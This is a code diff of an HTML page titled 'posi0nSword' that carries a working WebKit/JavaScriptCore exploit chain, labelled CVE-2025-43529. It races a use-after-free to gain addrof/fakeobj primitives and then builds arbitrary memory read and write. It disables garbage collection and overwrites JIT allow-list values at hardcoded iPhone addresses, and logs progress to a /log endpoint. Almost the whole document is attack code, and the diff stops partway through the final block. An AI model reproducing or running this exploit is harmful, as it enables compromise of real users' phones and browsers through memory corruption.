@@ -1,529 +1,579 @@
 <!doctype html>
 <html>
+
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>CVE-2025-43529 arbitrary ref / DS scribble testbench</title>
+    <title>posi0nSword</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 16px; background: #101216; color: #e7e7e7; }
-        button { font-size: 16px; padding: 10px 14px; margin: 8px 0; }
-        #output-list { white-space: pre-wrap; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
-        .ok { color: #66ff99; }
-        .warn { color: #ffd36a; }
-        .fail { color: #ff7777; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 16px;
+            background: #101216;
+            color: #e7e7e7;
+        }
+
+        button {
+            font-size: 16px;
+            padding: 10px 14px;
+            margin: 8px 0;
+        }
+
+        #output-list {
+            white-space: pre-wrap;
+            font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+            font-size: 12px;
+        }
+
+        .ok {
+            color: #66ff99;
+        }
+
+        .warn {
+            color: #ffd36a;
+        }
+
+        .fail {
+            color: #ff7777;
+        }
     </style>
 </head>
+
 <body>
-<h3>CVE-2025-43529 arbitrary ref / DS scribble testbench</h3>
-<button id="runner" onclick="init()">Run now</button>
-<div id="status">Idle</div>
-<div id="output-list"></div>
+    <h3>posi0nSword</h3>
+    <button id="runner" onclick="init()">Run now</button>
+    <div id="status">Idle</div>
+    <div id="output-list"></div>
 
-<script>
-"use strict";
+    <script>
+        "use strict";
 
-window.onerror = function(message, source, lineno, colno, error) {
-    try {
-        log(`JS ERROR line ${lineno}: ${message}`, "fail");
-        setStatus("script error");
-    } catch (_) {
-        const out = document.getElementById("output-list");
-        if (out) out.textContent += `JS ERROR line ${lineno}: ${message}\n`;
-    }
-    console.error("JS ERROR", message, source, lineno, colno, error);
-    return true;
-};
-
-const convBuf = new ArrayBuffer(8);
-const u8 = new Uint8Array(convBuf);
-const u32 = new Uint32Array(convBuf);
-const u64 = new BigUint64Array(convBuf);
-const f64 = new Float64Array(convBuf);
-
-function itof(value) {
-    u64[0] = BigInt.asUintN(64, value);
-    return f64[0];
-}
-
-function ftoi(value) {
-    f64[0] = value;
-    return u64[0];
-}
-
-function hex(value) {
-    if (typeof value !== "bigint") return String(value);
-    return "0x" + value.toString(16);
-}
-
-function noPAC(value) {
-    return value & 0xffffffffffn;
-}
-
-function bigintFromBytes(bytes) {
-    for (let i = 0; i < 8; ++i) u8[i] = bytes[i];
-    return u64[0];
-}
-
-function beacon(kind, message) {
-    try {
-        const img = new Image();
-        img.src = `/log?kind=${encodeURIComponent(kind)}&msg=${encodeURIComponent(String(message).slice(0, 300))}&t=${Date.now()}`;
-    } catch (_) {}
-}
-
-function log(output, cls) {
-    beacon(cls || "log", output);
-    const addline = document.createElement("div");
-    if (cls) addline.className = cls;
-    addline.textContent = `[${new Date().toISOString().split("T")[1].split(".")[0]}] ${output}`;
-    document.getElementById("output-list").appendChild(addline);
-    addline.scrollIntoView();
-    console.log(output);
-}
-
-function setStatus(s) {
-    beacon("status", s);
-    document.getElementById("status").textContent = s;
-    console.log("[status]", s);
-}
-
-function signed32(v) {
-    v &= 0xffffffffn;
-    if (v >= 0x80000000n) return Number(v - 0x100000000n);
-    return Number(v);
-}
-
-function plausiblePointer(p) {
-    return typeof p === "bigint" &&
-        p >= 0x100000000n &&
-        p < 0x0001000000000000n &&
-        (p & 0x7n) === 0n;
-}
-
-function buildDSScribblePrimitives(addrof, fakeobj) {
-    const report = {
-        ok: false,
-        stage: "init",
-        reason: "",
-        attempts: 0,
-        scribbleAddr: 0n,
-        vectorRaw: 0n,
-        backingPtr: 0n,
-        secondaryBackingPtr: 0n,
-        proofs: 0,
-    };
-
-    let read64;
-    let write64;
-    const keepAlive = [];
-    const read64BigUint64 = new BigUint64Array(4);
-    const read64Str = "\u4444".repeat(0x10);
-    void [][read64Str];
-
-    report.stage = "find-0x20-adjacent-jsobject";
-    let scribbleElement = null;
-    let prevAddr = 0n;
-    for (let i = 0; i < 1000; ++i) {
-        const o = { p1: 1.1, p2: 2.2 };
-        const addr = addrof(o);
-        report.attempts = i + 1;
-        if (addr - prevAddr === 0x20n) {
-            scribbleElement = o;
-            report.scribbleAddr = addr;
-            break;
-        }
-        keepAlive.push(o);
-        prevAddr = addr;
-    }
-    if (!scribbleElement) {
-        report.reason = "could not find adjacent 0x20 JSObject allocation";
-        return { ok: false, report };
-    }
-
-    let changeScribbleHolder;
-    let changeScribble;
-    let originalCell;
-
-    try {
-        report.stage = "build-change-scribble";
-        // Do not log or touch this fake object. It is a placeholder JSValue,
-        // immediately replaced after harvesting a valid DoubleArray cell.
-        changeScribbleHolder = {
-            p1: fakeobj(0x108240700000000n),
-            p2: scribbleElement
-        };
-        changeScribble = fakeobj(addrof(changeScribbleHolder) + 0x10n);
-
-        scribbleElement.p3 = 1.1;
-        scribbleElement[0] = 1.1;
-
-        const doubleArrayCell = ftoi(changeScribble[0]);
-        changeScribbleHolder.p1 = fakeobj(doubleArrayCell);
-        originalCell = changeScribble[0];
-    } catch (e) {
-        report.reason = `change scribble failed: ${e.message}`;
-        return { ok: false, report };
-    }
-
-    write64 = function(addr, value) {
-        addr = BigInt.asUintN(64, addr);
-        value = BigInt.asUintN(64, value);
-
-        changeScribble[0] = originalCell;
-        changeScribble[1] = itof(addr + 0x10n);
-
-        if (value === 0n) {
-            scribbleElement.p3 = 1;
-            delete scribbleElement.p3;
-        } else if (value < 0x2000000000000n) {
-            scribbleElement.p3 = fakeobj(value);
-        } else if (value <= 0x7ff2000000000000n ||
-                   (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
-            scribbleElement.p3 = itof(value - 0x2000000000000n);
-        } else {
-            const offAddr = addr + 8n;
-            const offVal = read64(offAddr);
-            const lo = signed32(value);
-            const hi = signed32(value >> 32n);
-            scribbleElement.p3 = lo;
-            changeScribble[1] = itof(addr + 0x14n);
-            scribbleElement.p3 = hi;
-            write64(offAddr, offVal);
-        }
-    };
-
-    try {
-        report.stage = "build-read64-string-window";
-        changeScribble[1] = itof(addrof(read64BigUint64) + 8n);
-        const read64Float64Bytes = ftoi(scribbleElement[1]);
-        read64BigUint64[0] = 0x10000000006n;
-        read64BigUint64[1] = read64Float64Bytes + 0x10n;
-
-        changeScribble[1] = itof(addrof(read64Str) + 8n);
-        scribbleElement[0] = itof(read64Float64Bytes);
-
-        read64 = function(addr) {
-            read64BigUint64[1] = BigInt.asUintN(64, addr);
-            return BigInt(read64Str.charCodeAt(0)) |
-                   (BigInt(read64Str.charCodeAt(1)) << 16n) |
-                   (BigInt(read64Str.charCodeAt(2)) << 32n) |
-                   (BigInt(read64Str.charCodeAt(3)) << 48n);
-        };
-    } catch (e) {
-        report.reason = `read64 setup failed: ${e.message}`;
-        return { ok: false, report };
-    }
-
-    try {
-        report.stage = "prove-typed-array-backing-store";
-        const proofKeepAlive = [];
-
-            
-            //log("Fetching JSC_base");
-            //const executable = read64(addrof(parseFloat) + 0x18n).noPAC();
-               //     globalFuncParseFloat = read64(executable + 0x28n);
-                    //const jsc_base= (function () {
-                        //let jsc_base = globalFuncParseFloat & ~0xfffn;
-
-                        //while (1) {
-                           //todo fix by adding the biguint64arr back 
-                            // read64_biguint64arr[1] = jsc_base;
-                            //if (read64_str.charCodeAt(0) == 0xfacf && read64_str.charCodeAt(1) == 0xfeed) {
-                                //return jsc_base;
-                          //  }
-                            //jsc_base -= 0x1000n;
-                        //}
-                   // })();
-                    //log("jsc_base: " + jsc_base.hex());
-                    
-        function proveBackingStore(label, seed) {
-            const proofBuffer = new ArrayBuffer(0x180);
-            const proofView = new DataView(proofBuffer);
-            const proofU8 = new Uint8Array(proofBuffer);
-            proofKeepAlive.push({ proofBuffer, proofView, proofU8 });
-
-            const markerA = 0x1122334455667788n ^ (BigInt(seed) << 8n);
-            const markerB = 0x8877665544332211n ^ (BigInt(seed) << 16n);
-            const directWriteMarker = 0x0102030405060708n ^ (BigInt(seed) << 24n);
-            // Deliberately in the JS NaN-boxing gap so write64 must take its
-            // split int32 path, not only the easy double-immediate path.
-            const splitWriteMarker = 0x7ff80000cafebeefn + BigInt(seed);
-
-            // Normal JS writes first; the primitive must independently read
-            // both offsets from the candidate backing store.
-            proofView.setBigUint64(0x00, markerA, true);
-            proofView.setBigUint64(0x40, markerB, true); 
-            const vectorRaw = read64(addrof(proofU8) + 0x10n);
-            if (label === "primary") report.vectorRaw = vectorRaw;
-
-            const candidates = [];
-            function addCandidate(p) {
-                if (plausiblePointer(p) && !candidates.includes(p)) candidates.push(p);
+        window.onerror = function (message, source, lineno, colno, error) {
+            try {
+                log(`JS ERROR line ${lineno}: ${message}`, "fail");
+                setStatus("script error");
+            } catch (_) {
+                const out = document.getElementById("output-list");
+                if (out) out.textContent += `JS ERROR line ${lineno}: ${message}\n`;
             }
-            addCandidate(vectorRaw);
-            addCandidate(noPAC(vectorRaw));
+            console.error("JS ERROR", message, source, lineno, colno, error);
+            return true;
+        };
 
-            for (const candidate of candidates) {
-                const readA = read64(candidate);
-                const readB = read64(candidate + 0x40n);
-                if (readA !== markerA || readB !== markerB) continue;
+        const convBuf = new ArrayBuffer(8);
+        const u8 = new Uint8Array(convBuf);
+        const u32 = new Uint32Array(convBuf);
+        const u64 = new BigUint64Array(convBuf);
+        const f64 = new Float64Array(convBuf);
 
-                const old8 = proofView.getBigUint64(0x08, true);
-                const old48 = proofView.getBigUint64(0x48, true);
+        function itof(value) {
+            u64[0] = BigInt.asUintN(64, value);
+            return f64[0];
+        }
 
-                write64(candidate + 0x08n, directWriteMarker);
-                const normalSawDirect = proofView.getBigUint64(0x08, true);
-                const primitiveSawDirect = read64(candidate + 0x08n);
+        function ftoi(value) {
+            f64[0] = value;
+            return u64[0];
+        }
 
-                write64(candidate + 0x48n, splitWriteMarker);
-                const normalSawSplit = proofView.getBigUint64(0x48, true);
-                const primitiveSawSplit = read64(candidate + 0x48n);
+        function hex(value) {
+            if (typeof value !== "bigint") return String(value);
+            return "0x" + value.toString(16);
+        }
 
-                write64(candidate + 0x08n, old8);
-                write64(candidate + 0x48n, old48);
+        function noPAC(value) {
+            return value & 0xffffffffffn;
+        }
 
-                if (normalSawDirect === directWriteMarker &&
-                    primitiveSawDirect === directWriteMarker &&
-                    normalSawSplit === splitWriteMarker &&
-                    primitiveSawSplit === splitWriteMarker) {
-                    return { backingPtr: candidate, vectorRaw };
+        function bigintFromBytes(bytes) {
+            for (let i = 0; i < 8; ++i) u8[i] = bytes[i];
+            return u64[0];
+        }
+
+        function beacon(kind, message) {
+            try {
+                const img = new Image();
+                img.src = `/log?kind=${encodeURIComponent(kind)}&msg=${encodeURIComponent(String(message).slice(0, 300))}&t=${Date.now()}`;
+            } catch (_) { }
+        }
+
+        function log(output, cls) {
+            beacon(cls || "log", output);
+            const addline = document.createElement("div");
+            if (cls) addline.className = cls;
+            addline.textContent = `[${new Date().toISOString().split("T")[1].split(".")[0]}] ${output}`;
+            document.getElementById("output-list").appendChild(addline);
+            addline.scrollIntoView();
+            console.log(output);
+        }
+
+        function setStatus(s) {
+            beacon("status", s);
+            document.getElementById("status").textContent = s;
+            console.log("[status]", s);
+        }
+
+        function signed32(v) {
+            v &= 0xffffffffn;
+            if (v >= 0x80000000n) return Number(v - 0x100000000n);
+            return Number(v);
+        }
+
+        function plausiblePointer(p) {
+            return typeof p === "bigint" &&
+                p >= 0x100000000n &&
+                p < 0x0001000000000000n &&
+                (p & 0x7n) === 0n;
+        }
+
+        function buildDSScribblePrimitives(addrof, fakeobj) {
+            const report = {
+                ok: false,
+                stage: "init",
+                reason: "",
+                attempts: 0,
+                scribbleAddr: 0n,
+                vectorRaw: 0n,
+                backingPtr: 0n,
+                secondaryBackingPtr: 0n,
+                proofs: 0,
+            };
+
+            let read64;
+            let write64;
+            const keepAlive = [];
+            const read64BigUint64 = new BigUint64Array(4);
+            const read64Str = "\u4444".repeat(0x10);
+            void [][read64Str];
+
+            report.stage = "find-0x20-adjacent-jsobject";
+            let scribbleElement = null;
+            let prevAddr = 0n;
+            for (let i = 0; i < 1000; ++i) {
+                const o = { p1: 1.1, p2: 2.2 };
+                const addr = addrof(o);
+                report.attempts = i + 1;
+                if (addr - prevAddr === 0x20n) {
+                    scribbleElement = o;
+                    report.scribbleAddr = addr;
+                    break;
                 }
+                keepAlive.push(o);
+                prevAddr = addr;
+            }
+            if (!scribbleElement) {
+                report.reason = "could not find adjacent 0x20 JSObject allocation";
+                return { ok: false, report };
             }
 
-            return null;
-        }
+            let changeScribbleHolder;
+            let changeScribble;
+            let originalCell;
 
-        const primaryProof = proveBackingStore("primary", 1);
-        if (!primaryProof) {
-            report.reason = `primary typed-array backing-store proof failed; vectorRaw=${hex(report.vectorRaw)}`;
-            return { ok: false, report, read64, write64 };
-        }
+            try {
+                report.stage = "build-change-scribble";
+                // Do not log or touch this fake object. It is a placeholder JSValue,
+                // immediately replaced after harvesting a valid DoubleArray cell.
+                changeScribbleHolder = {
+                    p1: fakeobj(0x108240700000000n),
+                    p2: scribbleElement
+                };
+                changeScribble = fakeobj(addrof(changeScribbleHolder) + 0x10n);
 
-        const secondaryProof = proveBackingStore("secondary", 2);
-        if (!secondaryProof) {
-            report.reason = `secondary typed-array backing-store proof failed after primary=${hex(primaryProof.backingPtr)}`;
-            return { ok: false, report, read64, write64 };
-        }
+                scribbleElement.p3 = 1.1;
+                scribbleElement[0] = 1.1;
 
-        report.ok = true;
-        report.stage = "verified";
-        report.backingPtr = primaryProof.backingPtr;
-        report.secondaryBackingPtr = secondaryProof.backingPtr;
-        report.proofs = 2;
-                        //DISABLE GC
-            ///DISABLE WORKLET GC
-            const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
-            log("vm:" + vm);
-            const heap = vm + 0xc0n;
-            log("heap:" + heap);
-            const isSafeToCollect = heap + 0x241n;
-            function write8(ptr, u16) {
+                const doubleArrayCell = ftoi(changeScribble[0]);
+                changeScribbleHolder.p1 = fakeobj(doubleArrayCell);
+                originalCell = changeScribble[0];
+            } catch (e) {
+                report.reason = `change scribble failed: ${e.message}`;
+                return { ok: false, report };
+            }
+
+            write64 = function (addr, value) {
+                addr = BigInt.asUintN(64, addr);
+                value = BigInt.asUintN(64, value);
+
+                changeScribble[0] = originalCell;
+                changeScribble[1] = itof(addr + 0x10n);
+
+                if (value === 0n) {
+                    scribbleElement.p3 = 1;
+                    delete scribbleElement.p3;
+                } else if (value < 0x2000000000000n) {
+                    scribbleElement.p3 = fakeobj(value);
+                } else if (value <= 0x7ff2000000000000n ||
+                    (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
+                    scribbleElement.p3 = itof(value - 0x2000000000000n);
+                } else {
+                    const offAddr = addr + 8n;
+                    const offVal = read64(offAddr);
+                    const lo = signed32(value);
+                    const hi = signed32(value >> 32n);
+                    scribbleElement.p3 = lo;
+                    changeScribble[1] = itof(addr + 0x14n);
+                    scribbleElement.p3 = hi;
+                    write64(offAddr, offVal);
+                }
+            };
+
+            try {
+                report.stage = "build-read64-string-window";
+                changeScribble[1] = itof(addrof(read64BigUint64) + 8n);
+                const read64Float64Bytes = ftoi(scribbleElement[1]);
+                read64BigUint64[0] = 0x10000000006n;
+                read64BigUint64[1] = read64Float64Bytes + 0x10n;
+
+                changeScribble[1] = itof(addrof(read64Str) + 8n);
+                scribbleElement[0] = itof(read64Float64Bytes);
+
+                read64 = function (addr) {
+                    read64BigUint64[1] = BigInt.asUintN(64, addr);
+                    return BigInt(read64Str.charCodeAt(0)) |
+                        (BigInt(read64Str.charCodeAt(1)) << 16n) |
+                        (BigInt(read64Str.charCodeAt(2)) << 32n) |
+                        (BigInt(read64Str.charCodeAt(3)) << 48n);
+                };
+                function read32(addr) {
+                    read64BigUint64[1] = addr;
+                    return (BigInt(read64_str.charCodeAt(0))
+                        | BigInt(read64_str.charCodeAt(1)) << 16n);
+                }
+            } catch (e) {
+                report.reason = `read64 setup failed: ${e.message}`;
+                return { ok: false, report };
+            }
+            try {
+                report.stage = "prove-typed-array-backing-store";
+                const proofKeepAlive = [];
+
+
+                //log("Fetching JSC_base");
+                //const executable = read64(addrof(parseFloat) + 0x18n).noPAC();
+                //     globalFuncParseFloat = read64(executable + 0x28n);
+                //const jsc_base= (function () {
+                //let jsc_base = globalFuncParseFloat & ~0xfffn;
+
+                //while (1) {
+                //todo fix by adding the biguint64arr back 
+                // read64_biguint64arr[1] = jsc_base;
+                //if (read64_str.charCodeAt(0) == 0xfacf && read64_str.charCodeAt(1) == 0xfeed) {
+                //return jsc_base;
+                //  }
+                //jsc_base -= 0x1000n;
+                //}
+                // })();
+                //log("jsc_base: " + jsc_base.hex());
+
+                function proveBackingStore(label, seed) {
+                    const proofBuffer = new ArrayBuffer(0x180);
+                    const proofView = new DataView(proofBuffer);
+                    const proofU8 = new Uint8Array(proofBuffer);
+                    proofKeepAlive.push({ proofBuffer, proofView, proofU8 });
+
+                    const markerA = 0x1122334455667788n ^ (BigInt(seed) << 8n);
+                    const markerB = 0x8877665544332211n ^ (BigInt(seed) << 16n);
+                    const directWriteMarker = 0x0102030405060708n ^ (BigInt(seed) << 24n);
+                    // Deliberately in the JS NaN-boxing gap so write64 must take its
+                    // split int32 path, not only the easy double-immediate path.
+                    const splitWriteMarker = 0x7ff80000cafebeefn + BigInt(seed);
+
+                    // Normal JS writes first; the primitive must independently read
+                    // both offsets from the candidate backing store.
+                    proofView.setBigUint64(0x00, markerA, true);
+                    proofView.setBigUint64(0x40, markerB, true);
+                    const vectorRaw = read64(addrof(proofU8) + 0x10n);
+                    if (label === "primary") report.vectorRaw = vectorRaw;
+
+                    const candidates = [];
+                    function addCandidate(p) {
+                        if (plausiblePointer(p) && !candidates.includes(p)) candidates.push(p);
+                    }
+                    addCandidate(vectorRaw);
+                    addCandidate(noPAC(vectorRaw));
+
+                    for (const candidate of candidates) {
+                        const readA = read64(candidate);
+                        const readB = read64(candidate + 0x40n);
+                        if (readA !== markerA || readB !== markerB) continue;
+
+                        const old8 = proofView.getBigUint64(0x08, true);
+                        const old48 = proofView.getBigUint64(0x48, true);
+
+                        write64(candidate + 0x08n, directWriteMarker);
+                        const normalSawDirect = proofView.getBigUint64(0x08, true);
+                        const primitiveSawDirect = read64(candidate + 0x08n);
+
+                        write64(candidate + 0x48n, splitWriteMarker);
+                        const normalSawSplit = proofView.getBigUint64(0x48, true);
+                        const primitiveSawSplit = read64(candidate + 0x48n);
+
+                        write64(candidate + 0x08n, old8);
+                        write64(candidate + 0x48n, old48);
+
+                        if (normalSawDirect === directWriteMarker &&
+                            primitiveSawDirect === directWriteMarker &&
+                            normalSawSplit === splitWriteMarker &&
+                            primitiveSawSplit === splitWriteMarker) {
+                            return { backingPtr: candidate, vectorRaw };
+                        }
+                    }
+
+                    return null;
+                }
+
+                const primaryProof = proveBackingStore("primary", 1);
+                if (!primaryProof) {
+                    report.reason = `primary typed-array backing-store proof failed; vectorRaw=${hex(report.vectorRaw)}`;
+                    return { ok: false, report, read64, write64 };
+                }
+
+                const secondaryProof = proveBackingStore("secondary", 2);
+                if (!secondaryProof) {
+                    report.reason = `secondary typed-array backing-store proof failed after primary=${hex(primaryProof.backingPtr)}`;
+                    return { ok: false, report, read64, write64 };
+                }
+
+                report.ok = true;
+                report.stage = "verified";
+                report.backingPtr = primaryProof.backingPtr;
+                report.secondaryBackingPtr = secondaryProof.backingPtr;
+                report.proofs = 2;
+                //DISABLE GC
+                ///DISABLE WORKLET GC
+                const vm = read64(read64(addrof(globalThis) + 0x10n) + 0x38n);
+                log("vm:" + vm);
+                const heap = vm + 0xc0n;
+                log("heap:" + heap);
+                const isSafeToCollect = heap + 0x241n;
+                function write8(ptr, u16) {
                     let value = read64(ptr);
                     value &= ~0xffn;
                     value |= u16;
                     write64(ptr, value);
                 };
-            write8(isSafeToCollect, 0n);
-            log("GC disabled", "ok")
-        return {
-            ok: true,
-            report,
-            read64,
-            write64,
-            keepAlive: {
-                keepAlive,
-                read64BigUint64,
-                read64Str,
-                scribbleElement,
-                changeScribbleHolder,
-                changeScribble,
-                proofKeepAlive
-            }
-        };
-    } catch (e) {
-        report.reason = `backing-store proof failed: ${e.message}`;
-        return { ok: false, report, read64, write64 };
-    }
-}
 
-async function init() {
-    const runner = document.getElementById("runner");
-    if (window.__cve43529Running) return;
-    window.__cve43529Running = true;
-    runner.disabled = true;
-    document.getElementById("output-list").textContent = "";
-    setStatus("running");
-
-    log("Stage 1: CVE-2025-43529 UAF trigger");
-
-    const rootArray = new Array(0x40_0000).fill(1.1);
-    const rootIndex = rootArray.length - 1;
-    const reclaimed = [];
-
-    function triggerUAF(flag, k, allocCount) {
-        const A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-        rootArray[rootIndex] = A;
-
-        const forGC = [];
-        const a = new Date(1111);
-        a[0] = 1.1;
-
-        for (let j = 0; j < allocCount; ++j) {
-            forGC.push(new ArrayBuffer(0x80_0000));
-        }
-
-        A.p2 = forGC;
-        const b = { p0: 0x42424242, p1: 1.1 };
-
-        let f = b;
-        if (flag) f = 1.1;
-
-        A.p1 = f;
-
-        let v = 1.1;
-        for (let i = 0; i < 1e6; ++i) {
-            for (let j = 0; j < k; ++j) {
-                v = i;
-                v = j;
+                write8(isSafeToCollect, 0n);
+                log("GC disabled", "ok")
+                log("[HERE BE DRAGONS] this code depends on iPhone 15 plus 26.1 offsets:", "warn");
+                //BUG: returns 0 on first read? 
+                //log("JSC__jitAllowList_once:" + read64(0x1ed7be888n)); //offsets.JavaScriptCore__jitAllowList_once
+                //log("JSC__jitAllowList: " + read64(0x1ed7bea70n)); //offsets.JavaScriptCore__jitAllowList
+                log("[modify JitAllowList]: writing..");
+                write64(0x1ed7be888n, 0xffffffffffffffffn);
+                write64(0x1ed7bea70n, 1n); //darksword used +8n on addr; however it seemed to crash, this yields a response on read after write. 
+                log("[modify JitAllowList]: reading..")
+                log("JSC__jitAllowList_once:" + read64(0x1ed7be888n));
+                log("JSC__jitAllowList: " + read64(0x1ed7bea70n));
+                log("[modify JitAllowList] modified!");
+             //   log("[HERE BE DRAGONS] this code depends on iPhone 15 plus 26.1 offsets:");
+                //contexts
+              //  log("Getting contexts...");
+                //original offset symbol = WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts 
+              //  const contexts = read64(0x1eb03ec80n);
+                //const contexts_length = read32(contexts - 4n);
+               // log(`contexts_length: ${contexts_length.hex()}`);
+                return {
+                    ok: true,
+                    report,
+                    read64,
+                    write64,
+                    keepAlive: {
+                        keepAlive,
+                        read64BigUint64,
+                        read64Str,
+                        scribbleElement,
+                        changeScribbleHolder,
+                        changeScribble,
+                        proofKeepAlive
+                    }
+                };
+            } catch (e) {
+                report.reason = `backing-store proof failed: ${e.message}`;
+                return { ok: false, report, read64, write64 };
             }
         }
 
-        b.p0 = v;
-        b.p1 = a;
-    }
+        async function init() {
+            const runner = document.getElementById("runner");
+            if (window.__cve43529Running) return;
+            window.__cve43529Running = true;
+            runner.disabled = true;
+            document.getElementById("output-list").textContent = "";
+            setStatus("running");
 
-    function recursive(n) {
-        if (n === 0) return;
-        recursive((n | 0) - 1);
-    }
+            log("Stage 1: CVE-2025-43529 UAF trigger");
 
-    function safeRecursive(n) {
-        try { recursive(n); } catch (e) {}
-    }
+            const rootArray = new Array(0x40_0000).fill(1.1);
+            const rootIndex = rootArray.length - 1;
+            const reclaimed = [];
 
-    triggerUAF(true, 1, 1);
-    triggerUAF(false, 1, 1);
+            function triggerUAF(flag, k, allocCount) {
+                const A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
+                rootArray[rootIndex] = A;
 
-    for (let i = 0; i < 1000; ++i) {
-        triggerUAF(false, 0, 0);
-    }
+                const forGC = [];
+                const a = new Date(1111);
+                a[0] = 1.1;
 
-    for (let i = 0; i < 20; ++i) {
-        safeRecursive(800);
-    }
-
-    let success = false;
-    let lastProgress = Date.now();
-
-    for (let k = 0; k < 15000; ++k) {
-        triggerUAF(false, 10, (k % 5) + 1);
-        safeRecursive(800);
-
-        for (let i = 0; i < 3; ++i) {
-            new ArrayBuffer(0x4000);
-        }
-
-        let freed;
-        try {
-            freed = rootArray[rootIndex].p1.p1;
-        } catch (e) {
-            continue;
-        }
-
-        let winningArray = null;
-        const noCow = 13.37;
-        for (let i = 0; i < 64; ++i) {
-            const spray = [13.37, 2.2, 3.3, 4.4, noCow];
-            reclaimed.push(spray);
-            try {
-                if (freed[0] === 13.37) {
-                    winningArray = spray;
-                    break;
+                for (let j = 0; j < allocCount; ++j) {
+                    forGC.push(new ArrayBuffer(0x80_0000));
                 }
-            } catch (e) {}
-        }
 
-        if (!winningArray) {
-            if ((Date.now() - lastProgress) > 1500) {
-                log(`attempt ${k}/15000; reclaimed arrays=${reclaimed.length}`, "warn");
-                setStatus(`racing ${k}/15000`);
-                lastProgress = Date.now();
-                await new Promise(r => setTimeout(r, 1));
+                A.p2 = forGC;
+                const b = { p0: 0x42424242, p1: 1.1 };
+
+                let f = b;
+                if (flag) f = 1.1;
+
+                A.p1 = f;
+
+                let v = 1.1;
+                for (let i = 0; i < 1e6; ++i) {
+                    for (let j = 0; j < k; ++j) {
+                        v = i;
+                        v = j;
+                    }
+                }
+
+                b.p0 = v;
+                b.p1 = a;
             }
-            continue;
+
+            function recursive(n) {
+                if (n === 0) return;
+                recursive((n | 0) - 1);
+            }
+
+            function safeRecursive(n) {
+                try { recursive(n); } catch (e) { }
+            }
+
+            triggerUAF(true, 1, 1);
+            triggerUAF(false, 1, 1);
+
+            for (let i = 0; i < 1000; ++i) {
+                triggerUAF(false, 0, 0);
+            }
+
+            for (let i = 0; i < 20; ++i) {
+                safeRecursive(800);
+            }
+
+            let success = false;
+            let lastProgress = Date.now();
+
+            for (let k = 0; k < 15000; ++k) {
+                triggerUAF(false, 10, (k % 5) + 1);
+                safeRecursive(800);
+
+                for (let i = 0; i < 3; ++i) {
+                    new ArrayBuffer(0x4000);
+                }
+
+                let freed;
+                try {
+                    freed = rootArray[rootIndex].p1.p1;
+                } catch (e) {
+                    continue;
+                }
+
+                let winningArray = null;
+                const noCow = 13.37;
+                for (let i = 0; i < 64; ++i) {
+                    const spray = [13.37, 2.2, 3.3, 4.4, noCow];
+                    reclaimed.push(spray);
+                    try {
+                        if (freed[0] === 13.37) {
+                            winningArray = spray;
+                            break;
+                        }
+                    } catch (e) { }
+                }
+
+                if (!winningArray) {
+                    if ((Date.now() - lastProgress) > 1500) {
+                        log(`attempt ${k}/15000; reclaimed arrays=${reclaimed.length}`, "warn");
+                        setStatus(`racing ${k}/15000`);
+                        lastProgress = Date.now();
+                        await new Promise(r => setTimeout(r, 1));
+                    }
+                    continue;
+                }
+
+                success = true;
+
+                // Critical primitive setup. Avoid DOM logging until addrof/fakeobj and
+                // the DS scribble proof have finished.
+                const boxedArray = winningArray;
+                boxedArray[0] = {};
+                const unboxedArray = freed;
+
+                function addrof(obj) {
+                    boxedArray[0] = obj;
+                    return ftoi(unboxedArray[0]);
+                }
+
+                function fakeobj(addr) {
+                    unboxedArray[0] = itof(addr);
+                    return boxedArray[0];
+                }
+
+                const addrBoxed = addrof(boxedArray);
+                const addrRoot = addrof(rootArray);
+                const fakeSelf = fakeobj(addrBoxed);
+
+                const ds = buildDSScribblePrimitives(addrof, fakeobj);
+
+                window.lastExploitState = {
+                    addrof,
+                    fakeobj,
+                    boxedArray,
+                    unboxedArray,
+                    rootArray,
+                    reclaimed,
+                    ds
+                };
+                if (ds.ok) {
+                    window.lastExploitState.read64 = ds.read64;
+                    window.lastExploitState.write64 = ds.write64;
+                    window.lastExploitState.keepAlive = ds.keepAlive;
+                }
+
+                log(`UAF won at attempt ${k}; reclaimed arrays=${reclaimed.length}`, "ok");
+                log(`addrof(boxedArray)=${hex(addrBoxed)}`, "ok");
+                log(`addrof(rootArray)=${hex(addrRoot)}`, "ok");
+                log(`fakeobj(addrof(boxedArray)) self type=${Object.prototype.toString.call(fakeSelf)}`, "ok");
+
+                log(`DS scribble stage=${ds.report.stage}`, ds.ok ? "ok" : "fail");
+                log(`DS scribble attempts=${ds.report.attempts}; scribble=${hex(ds.report.scribbleAddr)}`, ds.ok ? "ok" : "warn");
+                if (ds.report.vectorRaw) log(`typed-array vector raw=${hex(ds.report.vectorRaw)}`, ds.ok ? "ok" : "warn");
+
+                if (ds.ok) {
+                    log(`DS scribble read64/write64 VERIFIED; proofs=${ds.report.proofs}; backing=${hex(ds.report.backingPtr)}; secondary=${hex(ds.report.secondaryBackingPtr)}`, "ok");
+                    setStatus("verified WebContent read64/write64");
+                } else {
+                    log(`DS scribble failed: ${ds.report.reason}`, "fail");
+                    setStatus("addrof/fakeobj only; DS R/W not verified");
+                }
+                break;
+            }
+
+            if (!success) {
+                log("Stage 1 failed: race not won after max attempts", "fail");
+                setStatus("failed to win UAF race");
+            }
+
+            runner.disabled = false;
+            window.__cve43529Running = false;
         }
 
-        success = true;
-
-        // Critical primitive setup. Avoid DOM logging until addrof/fakeobj and
-        // the DS scribble proof have finished.
-        const boxedArray = winningArray;
-        boxedArray[0] = {};
-        const unboxedArray = freed;
-
-        function addrof(obj) {
-            boxedArray[0] = obj;
-            return ftoi(unboxedArray[0]);
-        }
-
-        function fakeobj(addr) {
-            unboxedArray[0] = itof(addr);
-            return boxedArray[0];
-        }
-
-        const addrBoxed = addrof(boxedArray);
-        const addrRoot = addrof(rootArray);
-        const fakeSelf = fakeobj(addrBoxed);
-
-        const ds = buildDSScribblePrimitives(addrof, fakeobj);
-
-        window.lastExploitState = {
-            addrof,
-            fakeobj,
-            boxedArray,
-            unboxedArray,
-            rootArray,
-            reclaimed,
